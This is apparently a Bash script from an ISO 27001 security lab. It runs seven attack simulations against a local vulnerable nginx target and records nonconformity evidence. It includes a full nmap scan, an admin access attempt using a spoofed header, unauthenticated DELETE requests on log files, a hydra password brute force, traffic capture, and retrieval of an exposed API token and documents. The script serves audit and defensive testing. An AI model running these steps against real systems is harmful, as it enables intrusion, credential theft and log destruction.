#!/bin/bash
# GRUPO 1 — nginx-vuln (perímetro + endpoints expuestos)
# Activos: HW-02+03, HW-07, HW-09, SW-04, SW-02+05, IF-01, IF-07
# Controles: A.8.20, A.8.22, A.8.5, A.5.7, A.8.13, A.8.15, A.8.24, A.5.23, A.8.3, A.5.12, A.5.17
#===========================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LAB_DIR="/home/kali/SGSI/lab"
EVID_DIR="/home/kali/SGSI/lab/evidencias/attacks/grupo1"
mkdir -p "$EVID_DIR"

echo "========================================="
echo " FASE 1 - GRUPO 1: nginx-vuln (7 simulaciones)"
echo " Fecha: $(date '+%Y-%m-%d %H:%M:%S')"
echo "========================================="

TARGET="localhost"
EVID_FILE="$EVID_DIR/no-conformidades.txt"
> "$EVID_FILE"

# --- Sim 1: HW-02+03 — Compromiso perimetral + evasión firewall ---
echo "" | tee -a "$EVID_FILE"
echo ">>> SIM #1: HW-02+03 — Compromiso perimetral (A.8.20, A.8.22, A.8.5, A.5.7)" | tee -a "$EVID_FILE"

nmap -sV -p- "$TARGET" 2>/dev/null | tee "$EVID_DIR/sim1-nmap-output.txt"
echo ""

# Evasión WAF simulada
curl -s -H "X-Forwarded-For: 10.0.0.1" "http://$TARGET/admin/" 2>/dev/null | head -20 | tee "$EVID_DIR/sim1-waf-bypass.txt"

echo "    RESULTADO: ⚠️  Pendiente de verificación (revisar puertos expuestos vs feed IoCs)" | tee -a "$EVID_FILE"

# --- Sim 2: HW-07 — Borrado grabaciones NVR ---
echo "" | tee -a "$EVID_FILE"
echo ">>> SIM #2: HW-07 — Borrado grabaciones NVR (A.8.13, A.8.15, A.8.5)" | tee -a "$EVID_FILE"

curl -s -X DELETE "http://$TARGET/logs/access.log" 2>/dev/null | tee "$EVID_DIR/sim2-nvr-borrado.txt"

echo "    RESULTADO: ⚠️  Pendiente — verificar con check-logs.sh si DELETE fue posible sin auth" | tee -a "$EVID_FILE"

# --- Sim 3: HW-09 — Fuga datos impresora ---
echo "" | tee -a "$EVID_FILE"
echo ">>> SIM #3: HW-09 — Fuga datos impresora (A.8.24)" | tee -a "$EVID_FILE"

curl -s "http://$TARGET/print/" 2>/dev/null | tee "$EVID_DIR/sim3-print-fuga.txt"

echo "    RESULTADO: ⚠️  Pendiente — verificar si /print/ expuso documentos sin auth" | tee -a "$EVID_FILE"

# --- Sim 4: SW-04 — Fuerza bruta ---
echo "" | tee -a "$EVID_FILE"
echo ">>> SIM #4: SW-04 — Fuerza bruta RDP simulado (A.8.15, A.8.24, A.8.5, A.5.17)" | tee -a "$EVID_FILE"

# Generar rockyou truncado si no existe
if [ ! -f /tmp/rockyou-top1000.txt ]; then
    echo "password123" > /tmp/rockyou-top1000.txt
    echo "admin" >> /tmp/rockyou-top1000.txt
    echo "123456" >> /tmp/rockyou-top1000.txt
    echo "TecnoGlobal2026!" >> /tmp/rockyou-top1000.txt
    echo "Passw0rd123" >> /tmp/rockyou-top1000.txt
    echo "admin123" >> /tmp/rockyou-top1000.txt
    echo "tecnoglobal" >> /tmp/rockyou-top1000.txt
    echo "sysadmin2026" >> /tmp/rockyou-top1000.txt
    echo "letmein" >> /tmp/rockyou-top1000.txt
    echo "welcome" >> /tmp/rockyou-top1000.txt
fi

hydra -l admin -P /tmp/rockyou-top1000.txt "http-get://$TARGET:80/admin/" 2>&1 | tee "$EVID_DIR/sim4-hydra-rdp.txt" || true

echo "    RESULTADO: ⚠️  Pendiente — verificar si hydra encontró credenciales" | tee -a "$EVID_FILE"

# --- Sim 5: SW-02+05 — Intercepción video + exposición Zendesk ---
echo "" | tee -a "$EVID_FILE"
echo ">>> SIM #5: SW-02+05 — Intercepción video + exposición API (A.5.23, A.8.5)" | tee -a "$EVID_FILE"

# Captura de tráfico simulado
timeout 5 tcpdump -i any port 80 -w "$EVID_DIR/sim5-tcpdump-captura.pcap" 2>/dev/null &
TPID=$!
curl -s "http://$TARGET/rtsp/" >/dev/null 2>&1 || true
wait $TPID 2>/dev/null || true
echo "  Captura guardada: sim5-tcpdump-captura.pcap ($(ls -lh "$EVID_DIR/sim5-tcpdump-captura.pcap" 2>/dev/null | awk '{print $5}')))"

# API token
curl -s "http://$TARGET/api/token" 2>/dev/null | tee "$EVID_DIR/sim5-api-token.txt"

echo "    RESULTADO: ⚠️  Pendiente — verificar si API token fue expuesta" | tee -a "$EVID_FILE"

# --- Sim 6: IF-01 — Fuga planos seguridad ---
echo "" | tee -a "$EVID_FILE"
echo ">>> SIM #6: IF-01 — Fuga planos seguridad (A.5.12, A.8.3)" | tee -a "$EVID_FILE"

curl -s -O "http://$TARGET/print/factura-proveedor-2026-07.pdf" 2>/dev/null
# Si existe PDF, se descargó sin auth = brecha
if [ -f factura-proveedor-2026-07.pdf ]; then
    echo "  ❌ Descarga exitosa sin autenticación — A.8.3 (ACL no implementado)" | tee -a "$EVID_FILE"
    mv factura-proveedor-2026-07.pdf "$EVID_DIR/sim6-planos-pdf/"
else
    echo "  ✅ No se pudo descargar archivo sin auth" | tee -a "$EVID_FILE"
fi
mkdir -p "$EVID_DIR/sim6-planos-pdf/"

curl -s -O "http://$TARGET/print/contrato-mantenimiento-2026.pdf" 2>/dev/null
curl -s -O "http://$TARGET/print/recibo-caja-2026-07-16.pdf" 2>/dev/null
mv *.pdf "$EVID_DIR/sim6-planos-pdf/" 2>/dev/null || true

# --- Sim 7: IF-07 — Borrado logs VPN ---
echo "" | tee -a "$EVID_FILE"
echo ">>> SIM #7: IF-07 — Borrado logs VPN (A.8.15)" | tee -a "$EVID_FILE"

curl -s -X DELETE "http://$TARGET/logs/*" 2>/dev/null | tee "$EVID_DIR/sim7-logs-delete.txt"

echo "    RESULTADO: ⚠️  Pendiente — verificar con check-logs.sh si DELETE fue posible" | tee -a "$EVID_FILE"

# Post-sim: SIEM review
echo "" | tee -a "$EVID_FILE"
echo ">>> POST-SIM: Revisión SIEM lightweight" | tee -a "$EVID_FILE"
bash "$LAB_DIR/scripts/check-logs.sh" > "$EVID_DIR/siem-$(date +%Y%m%d-%H%M%S).txt" 2>&1 || true

echo "" | tee -a "$EVID_FILE"
echo "=========================================" | tee -a "$EVID_FILE"
echo " GRUPO 1 COMPLETADO — 7 simulaciones" | tee -a "$EVID_FILE"
echo " Evidencias: $EVID_DIR/" | tee -a "$EVID_FILE"
echo "=========================================" | tee -a "$EVID_FILE"
